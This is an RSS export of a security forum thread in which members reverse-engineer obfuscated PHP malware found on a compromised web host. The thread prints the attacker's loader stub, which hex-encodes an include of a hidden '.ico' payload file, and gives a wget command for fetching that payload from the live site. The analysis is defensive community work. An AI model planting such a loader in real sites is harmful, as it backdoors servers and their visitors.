<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>What kind of php malware is this?</title>
    <link>https://0x00sec.org/t/what-kind-of-php-malware-is-this/8180</link>
    <description>So I found the below piece of code in my webhost account, it was smart enough to overwrite my default index.html and replaced it with index.php containing the below code which got executed each time someone hit the website without showing any signs of hacks to the end user.
Turns out my ftp username was compromised so thats how it found its way however I trying to decode and make sense of what exactly it does.

any takers ?

    &lt;?php

    /*ade56*/

    @include &quot;\x2fhome\x2feddy\x77ebs/\x65ddyw\x65bs.c\x6fm/pa\x73swor\x64-gen\x65rato\x72/css\x2f.d40\x64f8b5\x2eico&quot;;

    /*ade56*/


    echo @file_get_contents(&#39;index.html.bak.bak&#39;);</description>
    
    <lastBuildDate>Thu, 23 Aug 2018 13:45:39 +0000</lastBuildDate>
    <category>Questions</category>
    <atom:link href="https://0x00sec.org/t/what-kind-of-php-malware-is-this/8180.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>What kind of php malware is this?</title>
        <dc:creator><![CDATA[system]]></dc:creator>
        <description><![CDATA[
            <p>This topic was automatically closed 3 days after the last reply. New replies are no longer allowed.</p>
          <p><a href="https://0x00sec.org/t/what-kind-of-php-malware-is-this/8180/19">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/what-kind-of-php-malware-is-this/8180/19</link>
        <pubDate>Sun, 26 Aug 2018 13:45:43 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-8180-19</guid>
        <source url="https://0x00sec.org/t/what-kind-of-php-malware-is-this/8180.rss">What kind of php malware is this?</source>
      </item>
      <item>
        <title>What kind of php malware is this?</title>
        <dc:creator><![CDATA[pry0cc]]></dc:creator>
        <description><![CDATA[
            <p>I 100% want to see a writeup for this. I got a little way through, but got stuck on the second level.</p>
<p>Real world malware is so useful to read about and learn from. If you did that, it would be awesome!</p>
          <p><a href="https://0x00sec.org/t/what-kind-of-php-malware-is-this/8180/18">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/what-kind-of-php-malware-is-this/8180/18</link>
        <pubDate>Thu, 23 Aug 2018 13:45:39 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-8180-18</guid>
        <source url="https://0x00sec.org/t/what-kind-of-php-malware-is-this/8180.rss">What kind of php malware is this?</source>
      </item>
      <item>
        <title>What kind of php malware is this?</title>
        <dc:creator><![CDATA[net_phile]]></dc:creator>
        <description><![CDATA[
            <p>I like how the .dotfile name convention is used because if you use command ls it doesnt show.</p>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/5/57290dd9987f93892840b7905ba6142d04ae9f6c.PNG" alt="Capture" data-base62-sha1="cr3uS43FCpfqWgEjzI2Q2bHK7gg" width="690" height="197"></p>
<p>anyways the dump for the ico is file is available here &gt;&gt; <a href="http://termbin.com/ern5" rel="noopener nofollow ugc">http://termbin.com/ern5</a></p>
          <p><a href="https://0x00sec.org/t/what-kind-of-php-malware-is-this/8180/17">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/what-kind-of-php-malware-is-this/8180/17</link>
        <pubDate>Wed, 22 Aug 2018 15:59:52 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-8180-17</guid>
        <source url="https://0x00sec.org/t/what-kind-of-php-malware-is-this/8180.rss">What kind of php malware is this?</source>
      </item>
      <item>
        <title>What kind of php malware is this?</title>
        <dc:creator><![CDATA[net_phile]]></dc:creator>
        <description><![CDATA[
            <p>Hi guys just got this <a class="mention" href="https://0x00sec.org/u/ricksanchez">@ricksanchez</a> the file seems to be introduced on Aug 14 in webserver and is not in original src code.</p>
<p>Here was what I found in server using ls -la,<br>
<img src="//0x00sec.s3.amazonaws.com/original/2X/0/046516ba417019d3403533951728d68b3c484dfc.PNG" alt="Capture" data-base62-sha1="CSutGoCegFIST31obm2h0FBfBy" width="690" height="219"><br>
I will contact the sys admins to see find out any more info. About the actual contents of .ico file I guess smart folks here have already figured that out.</p>
          <p><a href="https://0x00sec.org/t/what-kind-of-php-malware-is-this/8180/16">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/what-kind-of-php-malware-is-this/8180/16</link>
        <pubDate>Wed, 22 Aug 2018 15:48:24 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-8180-16</guid>
        <source url="https://0x00sec.org/t/what-kind-of-php-malware-is-this/8180.rss">What kind of php malware is this?</source>
      </item>
      <item>
        <title>What kind of php malware is this?</title>
        <dc:creator><![CDATA[anon79434934]]></dc:creator>
        <description><![CDATA[
            <aside class="quote no-group" data-username="Megabeets" data-post="14" data-topic="8180">
<div class="title">
<div class="quote-controls"></div>
<img alt="" width="20" height="20" src="https://0x00sec.org/user_avatar/0x00sec.org/megabeets/40/5303_2.png" class="avatar"> Megabeets:</div>
<blockquote>
<p>If there’ll be a request I’ll write you a write-up of how I did it and why I did every step.</p>
</blockquote>
</aside>
<p>YES PLEASE! A websec noob like me could use such a thing.</p>
          <p><a href="https://0x00sec.org/t/what-kind-of-php-malware-is-this/8180/15">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/what-kind-of-php-malware-is-this/8180/15</link>
        <pubDate>Tue, 21 Aug 2018 22:28:16 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-8180-15</guid>
        <source url="https://0x00sec.org/t/what-kind-of-php-malware-is-this/8180.rss">What kind of php malware is this?</source>
      </item>
      <item>
        <title>What kind of php malware is this?</title>
        <dc:creator><![CDATA[Megabeets]]></dc:creator>
        <description><![CDATA[
            <p><strong>Hi there!</strong>  Thanks for a fun challenge! I’m sharing here the clear-text code in its final stage <img src="https://0x00sec.org/images/emoji/twitter/smiley.png?v=9" title=":smiley:" class="emoji" alt=":smiley:"></p>
<p>As a malware researcher, I encounter tons of examples as this. My main method is to clean the noise and let the malicious code to decrypt itself. If there’ll be a request I’ll write you a write-up of how I did it and why I did every step.</p>
<p><strong>So what we have here?</strong><br>
Seems like an implementation of a TDS Client and an injection of a Javascript code to the browser. This is just an assumption from a quick read of the keywords.<br>
I honestly didn’t read the code once I got to the final stage of a clear-text + commented code.<br>
The next is for you as an exercise <img src="https://0x00sec.org/images/emoji/twitter/smiley.png?v=9" title=":smiley:" class="emoji" alt=":smiley:"></p>
<p>You can try, for example, to decrypt the encoded config data.</p>
<p>Here’s the decrypted source – Enjoy!</p>
<p><a href="https://bin.0x00sec.org/?245e01df980d279d#1nKpPUgNP9n26NFXybdiIrFK+STxF6xlx1Dw2eDOBck=" class="onebox" target="_blank">https://bin.0x00sec.org/?245e01df980d279d#1nKpPUgNP9n26NFXybdiIrFK+STxF6xlx1Dw2eDOBck=</a></p>
          <p><a href="https://0x00sec.org/t/what-kind-of-php-malware-is-this/8180/14">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/what-kind-of-php-malware-is-this/8180/14</link>
        <pubDate>Tue, 21 Aug 2018 18:54:08 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-8180-14</guid>
        <source url="https://0x00sec.org/t/what-kind-of-php-malware-is-this/8180.rss">What kind of php malware is this?</source>
      </item>
      <item>
        <title>What kind of php malware is this?</title>
        <dc:creator><![CDATA[ricksanchez]]></dc:creator>
        <description><![CDATA[
            <p>changing the eval to an echo in the weird php code of the .ico and running it with php file reveals some new obfuscated php code.</p>
<p>I renamed the variables to my best knowledge:</p>
<p><a href="https://bin.0x00sec.org/?636b78ef372b3298#0cYPTBYJlQnpcFVhdeaZxq7e692up51YBSTLxdhM7hc=" class="onebox" target="_blank">https://bin.0x00sec.org/?636b78ef372b3298#0cYPTBYJlQnpcFVhdeaZxq7e692up51YBSTLxdhM7hc=</a></p>
          <p><a href="https://0x00sec.org/t/what-kind-of-php-malware-is-this/8180/13">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/what-kind-of-php-malware-is-this/8180/13</link>
        <pubDate>Tue, 21 Aug 2018 17:10:39 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-8180-13</guid>
        <source url="https://0x00sec.org/t/what-kind-of-php-malware-is-this/8180.rss">What kind of php malware is this?</source>
      </item>
      <item>
        <title>What kind of php malware is this?</title>
        <dc:creator><![CDATA[pry0cc]]></dc:creator>
        <description><![CDATA[
            <p>So I’ve managed to get past the first level of obfuscation:</p>
<p>This is what it evals:</p>
<p><a href="https://bin.0x00sec.org/?76470af471b05a47#rUUJouc5JzCU0HeRMzjbJVzXb+Y7RdsJ7Lk9HggR+BA=" class="onebox" target="_blank">https://bin.0x00sec.org/?76470af471b05a47#rUUJouc5JzCU0HeRMzjbJVzXb+Y7RdsJ7Lk9HggR+BA=</a></p>
          <p><a href="https://0x00sec.org/t/what-kind-of-php-malware-is-this/8180/12">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/what-kind-of-php-malware-is-this/8180/12</link>
        <pubDate>Tue, 21 Aug 2018 16:49:20 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-8180-12</guid>
        <source url="https://0x00sec.org/t/what-kind-of-php-malware-is-this/8180.rss">What kind of php malware is this?</source>
      </item>
      <item>
        <title>What kind of php malware is this?</title>
        <dc:creator><![CDATA[pry0cc]]></dc:creator>
        <description><![CDATA[
            <p>I changed some of the variables to make things easier:</p>
<p><a href="https://bin.0x00sec.org/?b700053e4e756c5a#G8AZeP1dHc8sQx855ork0kqeUIGIe8OTcTo871zP8Os=" class="onebox" target="_blank">https://bin.0x00sec.org/?b700053e4e756c5a#G8AZeP1dHc8sQx855ork0kqeUIGIe8OTcTo871zP8Os=</a></p>
          <p><a href="https://0x00sec.org/t/what-kind-of-php-malware-is-this/8180/11">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/what-kind-of-php-malware-is-this/8180/11</link>
        <pubDate>Tue, 21 Aug 2018 16:40:17 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-8180-11</guid>
        <source url="https://0x00sec.org/t/what-kind-of-php-malware-is-this/8180.rss">What kind of php malware is this?</source>
      </item>
      <item>
        <title>What kind of php malware is this?</title>
        <dc:creator><![CDATA[pry0cc]]></dc:creator>
        <description><![CDATA[
            <p>Check the 0x00bin ^^, I copied and pasted it there.</p>
          <p><a href="https://0x00sec.org/t/what-kind-of-php-malware-is-this/8180/10">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/what-kind-of-php-malware-is-this/8180/10</link>
        <pubDate>Tue, 21 Aug 2018 16:22:49 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-8180-10</guid>
        <source url="https://0x00sec.org/t/what-kind-of-php-malware-is-this/8180.rss">What kind of php malware is this?</source>
      </item>
      <item>
        <title>What kind of php malware is this?</title>
        <dc:creator><![CDATA[ricksanchez]]></dc:creator>
        <description><![CDATA[
            <p>woops I missed that ‘/’ in that URL there. my bad <img src="https://0x00sec.org/images/emoji/twitter/smiley.png?v=9" title=":smiley:" class="emoji" alt=":smiley:"></p>
<p>edit: but yeah that .ico file looks suspicious. especially the mapping from numbers to characters halfway in</p>
          <p><a href="https://0x00sec.org/t/what-kind-of-php-malware-is-this/8180/9">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/what-kind-of-php-malware-is-this/8180/9</link>
        <pubDate>Tue, 21 Aug 2018 16:18:15 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-8180-9</guid>
        <source url="https://0x00sec.org/t/what-kind-of-php-malware-is-this/8180.rss">What kind of php malware is this?</source>
      </item>
      <item>
        <title>What kind of php malware is this?</title>
        <dc:creator><![CDATA[pry0cc]]></dc:creator>
        <description><![CDATA[
            <aside class="quote group-VIP quote-modified" data-username="ricksanchez" data-post="4" data-topic="8180">
<div class="title">
<div class="quote-controls"></div>
<img alt="" width="20" height="20" src="https://0x00sec.org/user_avatar/0x00sec.org/ricksanchez/40/4625_2.png" class="avatar"> ricksanchez:</div>
<blockquote>
<p><a href="http://eddywebs.com/password-generatorcss/.d40df8b5.ico">eddywebs.com/password-generatorcss/.d40df8b5.ico</a></p>
</blockquote>
</aside>
<p><a href="http://eddywebs.com/password-generator/css/.d40df8b5.ico" class="onebox" target="_blank">http://eddywebs.com/password-generator/css/.d40df8b5.ico</a></p>
          <p><a href="https://0x00sec.org/t/what-kind-of-php-malware-is-this/8180/8">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/what-kind-of-php-malware-is-this/8180/8</link>
        <pubDate>Tue, 21 Aug 2018 16:17:05 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-8180-8</guid>
        <source url="https://0x00sec.org/t/what-kind-of-php-malware-is-this/8180.rss">What kind of php malware is this?</source>
      </item>
      <item>
        <title>What kind of php malware is this?</title>
        <dc:creator><![CDATA[ricksanchez]]></dc:creator>
        <description><![CDATA[
            <p>Reagrding the password generator:</p>
<p><a href="http://www.eddywebs.com/">http://www.eddywebs.com/</a> if that’s the URL it points to his github which has:</p>
<aside class="onebox allowlistedgeneric">
  <header class="source">
      <img src="https://github.githubassets.com/favicons/favicon.svg" class="site-icon" width="32" height="32">
      <a href="https://github.com/eddywebs/password-generator" target="_blank" rel="noopener">GitHub</a>
  </header>
  <article class="onebox-body">
    <img src="//0x00sec.s3.amazonaws.com/original/2X/1/135fc6ab691d296d613cd7927b67bc904a213446.png" class="thumbnail" width="" height="">

<h3><a href="https://github.com/eddywebs/password-generator" target="_blank" rel="noopener">eddywebs/password-generator</a></h3>

<p>XKCD Inspired password generator. Contribute to eddywebs/password-generator development by creating an account on GitHub.</p>


  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

          <p><a href="https://0x00sec.org/t/what-kind-of-php-malware-is-this/8180/7">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/what-kind-of-php-malware-is-this/8180/7</link>
        <pubDate>Tue, 21 Aug 2018 16:16:25 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-8180-7</guid>
        <source url="https://0x00sec.org/t/what-kind-of-php-malware-is-this/8180.rss">What kind of php malware is this?</source>
      </item>
      <item>
        <title>What kind of php malware is this?</title>
        <dc:creator><![CDATA[pry0cc]]></dc:creator>
        <description><![CDATA[
            <p>If you navigate there, you find this…</p>
<p><a href="https://bin.0x00sec.org/?43d378b1d2216006#lvlACzuo2Qm+PSmb+/rIxaqqdZDxG4r5UH5HnIRqBhI=" class="onebox" target="_blank">https://bin.0x00sec.org/?43d378b1d2216006#lvlACzuo2Qm+PSmb+/rIxaqqdZDxG4r5UH5HnIRqBhI=</a></p>
          <p><a href="https://0x00sec.org/t/what-kind-of-php-malware-is-this/8180/6">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/what-kind-of-php-malware-is-this/8180/6</link>
        <pubDate>Tue, 21 Aug 2018 16:13:45 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-8180-6</guid>
        <source url="https://0x00sec.org/t/what-kind-of-php-malware-is-this/8180.rss">What kind of php malware is this?</source>
      </item>
      <item>
        <title>What kind of php malware is this?</title>
        <dc:creator><![CDATA[pry0cc]]></dc:creator>
        <description><![CDATA[
            <p><a class="mention" href="https://0x00sec.org/u/net_phile">@net_phile</a>, can you see what is inside of that file?</p>
          <p><a href="https://0x00sec.org/t/what-kind-of-php-malware-is-this/8180/5">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/what-kind-of-php-malware-is-this/8180/5</link>
        <pubDate>Tue, 21 Aug 2018 16:12:21 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-8180-5</guid>
        <source url="https://0x00sec.org/t/what-kind-of-php-malware-is-this/8180.rss">What kind of php malware is this?</source>
      </item>
      <item>
        <title>What kind of php malware is this?</title>
        <dc:creator><![CDATA[ricksanchez]]></dc:creator>
        <description><![CDATA[
            <p>Replacing all these ‘\xYY’ with their respective ASCII representantion yields:</p>
<pre><code class="lang-auto">@include "/home/eddywebs/eddywebs.com/password-generator/css/.d40df8b5.ico";
</code></pre>
<p>no idea what the ade56 is all about?<br>
maybe it’s supposed to be a <em>clever</em> algo cloaking the actual <code>#include</code>…</p>
<p><code>wget eddywebs.com/password-generator/css/.d40df8b5.ico &gt; sample </code><br>
gives us a some weird ass php code. looks ‘encrypted’ with some number2character mapping…</p>
          <p><a href="https://0x00sec.org/t/what-kind-of-php-malware-is-this/8180/4">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/what-kind-of-php-malware-is-this/8180/4</link>
        <pubDate>Tue, 21 Aug 2018 16:10:19 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-8180-4</guid>
        <source url="https://0x00sec.org/t/what-kind-of-php-malware-is-this/8180.rss">What kind of php malware is this?</source>
      </item>
      <item>
        <title>What kind of php malware is this?</title>
        <dc:creator><![CDATA[pry0cc]]></dc:creator>
        <description><![CDATA[
            <p>If you remove all the '\x’s, you’ll notice that you get this:</p>
<pre><code class="lang-auto">home2feddy77ebs/65ddyw65bs.c6fm/pa73swor64-gen65rato72/css2f.d4064f8b52eico
</code></pre>
          <p><a href="https://0x00sec.org/t/what-kind-of-php-malware-is-this/8180/3">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/what-kind-of-php-malware-is-this/8180/3</link>
        <pubDate>Tue, 21 Aug 2018 15:53:12 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-8180-3</guid>
        <source url="https://0x00sec.org/t/what-kind-of-php-malware-is-this/8180.rss">What kind of php malware is this?</source>
      </item>
      <item>
        <title>What kind of php malware is this?</title>
        <dc:creator><![CDATA[pry0cc]]></dc:creator>
        <description><![CDATA[
            <p>Ooooh interesting. <a class="mention" href="https://0x00sec.org/u/ricksanchez">@ricksanchez</a> check this out. Who wants some reverse engineering of real malware? <a class="mention" href="https://0x00sec.org/u/cry0l1t3">@Cry0l1t3</a> <a class="mention" href="https://0x00sec.org/u/fraq">@fraq</a> <a class="mention" href="https://0x00sec.org/u/anon79434934">@anon79434934</a></p>
          <p><a href="https://0x00sec.org/t/what-kind-of-php-malware-is-this/8180/2">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/what-kind-of-php-malware-is-this/8180/2</link>
        <pubDate>Tue, 21 Aug 2018 15:44:56 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-8180-2</guid>
        <source url="https://0x00sec.org/t/what-kind-of-php-malware-is-this/8180.rss">What kind of php malware is this?</source>
      </item>
      <item>
        <title>What kind of php malware is this?</title>
        <dc:creator><![CDATA[net_phile]]></dc:creator>
        <description><![CDATA[
            <p>So I found the below piece of code in my webhost account, it was smart enough to overwrite my default index.html and replaced it with index.php containing the below code which got executed each time someone hit the website without showing any signs of hacks to the end user.<br>
Turns out my ftp username was compromised so thats how it found its way however I trying to decode and make sense of what exactly it does.</p>
<p>any takers ?</p>
<pre><code>&lt;?php

/*ade56*/

@include "\x2fhome\x2feddy\x77ebs/\x65ddyw\x65bs.c\x6fm/pa\x73swor\x64-gen\x65rato\x72/css\x2f.d40\x64f8b5\x2eico";

/*ade56*/


echo @file_get_contents('index.html.bak.bak');</code></pre>
          <p><a href="https://0x00sec.org/t/what-kind-of-php-malware-is-this/8180/1">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/what-kind-of-php-malware-is-this/8180/1</link>
        <pubDate>Tue, 21 Aug 2018 15:23:48 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-8180-1</guid>
        <source url="https://0x00sec.org/t/what-kind-of-php-malware-is-this/8180.rss">What kind of php malware is this?</source>
      </item>
  </channel>
</rss>
